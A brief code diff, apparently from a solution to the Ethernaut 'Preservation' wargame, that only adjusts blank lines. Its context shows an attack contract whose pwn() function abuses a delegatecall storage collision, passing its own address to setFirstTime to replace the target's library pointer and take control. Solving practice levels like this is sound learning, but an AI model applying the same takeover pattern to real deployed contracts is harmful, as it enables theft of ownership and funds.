@@ -50,7 +50,6 @@ owner = msg.sender;
 preservation = IPreservation(_target);
 }
 
-
     address public timeZone1Library;
     address public timeZone2Library;
     address public owner;
@@ -63,5 +62,6 @@ preservation = IPreservation(_target);
         function pwn() public {
 preservation.setFirstTime(uint256(uint160(address(address(this)))));
 }
+
 
 }
